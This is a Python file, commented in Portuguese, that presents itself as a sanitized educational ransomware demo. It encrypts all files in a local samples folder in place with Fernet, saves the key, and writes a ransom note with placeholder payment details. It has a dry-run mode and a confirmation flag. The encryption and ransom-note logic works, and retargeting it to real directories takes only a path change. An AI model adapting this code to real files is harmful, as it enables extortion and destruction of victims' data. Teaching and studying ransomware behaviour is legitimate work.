"""
ransomware_demo_safe.py
Versão SANITIZADA do ransomware para fins educacionais.
- Opera apenas sobre a pasta `samples/test_files` (relativa ao projeto).
- Tem modo --dry-run que não modifica arquivos.
- Gera chave em arquivo localizado dentro do diretório do demo (evita sobrescrever coisas do sistema).
- Substitui endereços/contatos por PLACEHOLDER_...
"""

import argparse
import os
from cryptography.fernet import Fernet

BASE_DIR = os.path.dirname(__file__)  # code/ransomware-demo
SAMPLES_DIR = os.path.normpath(os.path.join(BASE_DIR, "..", "samples", "test_files"))
KEY_PATH = os.path.join(BASE_DIR, "chave_demo.key")
NOTE_PATH = os.path.join(BASE_DIR, "LEIA-ME-DEMO.txt")

IGNORED_FILES = {"ransomware_demo_safe.py", "chave_demo.key", "LEIA-ME-DEMO.txt"}

def gerar_chave(path=KEY_PATH, dry_run=False):
    if dry_run:
        print("[DRY-RUN] Geraria uma chave em:", path)
        return None
    chave = Fernet.generate_key()
    with open(path, "wb") as f:
        f.write(chave)
    print("Chave gerada em:", path)
    return chave

def carregar_chave(path=KEY_PATH):
    with open(path, "rb") as f:
        return f.read()

def criptografar_arquivo(caminho_arquivo, chave, dry_run=False):
    f = Fernet(chave)
    if dry_run:
        print(f"[DRY-RUN] Arquivo a encriptar: {caminho_arquivo}")
        return
    with open(caminho_arquivo, "rb") as file:
        dados = file.read()
    dados_criptografados = f.encrypt(dados)
    with open(caminho_arquivo, "wb") as file:
        file.write(dados_criptografados)
    print("Encriptado:", caminho_arquivo)

def encontrar_arquivos(diretorio):
    lista = []
    for raiz, _, arquivos in os.walk(diretorio):
        for nome in arquivos:
            if nome in IGNORED_FILES or nome.endswith(".key"):
                continue
            caminho_completo = os.path.join(raiz, nome)
            lista.append(caminho_completo)
    return lista

def criar_mensagem_resgate(path=NOTE_PATH, dry_run=False):
    texto = (
        "Seus arquivos foram criptografados (DEMO)!\n"
        "Isto é um exemplo para fins educacionais.\n"
        "Endereço para pagamento: PLACEHOLDER_BTC_ADDR\n"
        "Contato: PLACEHOLDER_EMAIL\n"
    )
    if dry_run:
        print("[DRY-RUN] Criaria o arquivo de resgate em:", path)
        print(texto)
        return
    with open(path, "w", encoding="utf-8") as f:
        f.write(texto)
    print("Arquivo de instruções criado em:", path)

def main():
    parser = argparse.ArgumentParser(description="Ransomware Demo (SANITIZED)")
    parser.add_argument("--dry-run", action="store_true", help="Simula ações sem modificar arquivos")
    parser.add_argument("--confirm", action="store_true", help="Confirma que você leu os avisos (required to run without dry-run)")
    args = parser.parse_args()

    print("Ransomware Demo (SANITIZED). Diretório alvo:", SAMPLES_DIR)
    if not args.dry_run and not args.confirm:
        print("Para executar sem --dry-run, adicione --confirm (evita execução acidental).")
        return

    os.makedirs(SAMPLES_DIR, exist_ok=True)

    # Gerar chave (ou mostrar que faria)
    if not args.dry_run:
        gerar_chave(dry_run=False)
        chave = carregar_chave()
    else:
        gerar_chave(dry_run=True)
        # cria chave temporária para simulação (não escrita)
        chave = Fernet.generate_key()

    arquivos = encontrar_arquivos(SAMPLES_DIR)
    if not arquivos:
        print("Nenhum arquivo encontrado em samples/test_files. Adicione arquivos de teste se desejar.")
    for arquivo in arquivos:
        criptografar_arquivo(arquivo, chave, dry_run=args.dry_run)

    criar_mensagem_resgate(dry_run=args.dry_run)
    print("Operação do demo concluída. (modo dry-run =", args.dry_run, ")")

if __name__ == "__main__":
    main()
